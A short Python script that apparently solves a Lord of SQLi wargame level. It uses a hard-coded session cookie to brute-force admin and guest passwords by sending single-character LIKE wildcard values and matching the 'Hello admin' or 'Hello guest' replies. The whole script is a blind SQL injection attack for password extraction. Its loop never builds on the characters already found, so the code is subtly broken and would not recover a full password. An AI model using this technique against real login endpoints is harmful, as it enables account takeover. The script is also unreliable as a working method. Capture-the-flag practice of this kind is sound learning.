#!/usr/bin/python3
# -*- coding: utf-8 -*-

import urllib3
import requests
import time

flag = ""
guest = ""
length = 1
result = ""

session = dict(PHPSESSID="ckodq6o9k9qjamdq5in4oktego")

for k in range(1, 99):
    for j in range(48, 126):
        try:
            r = requests.post(
                "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=" + chr(j) + "%",
                cookies=session)
            print(k, chr(j))
        except:
            print("exception_flag")
            continue
        if 'Hello admin' in r.text:
            flag = flag + chr(j)
            print("[+] finding PW : " + flag)
        elif 'Hello guest' in r.text:
            guest = guest + chr(j)
        time.sleep(0.1)

result = flag.lower()
guest = guest.lower()
print("[+] pw of admin : " + result)
print("[+] pw of guset : " + guest)
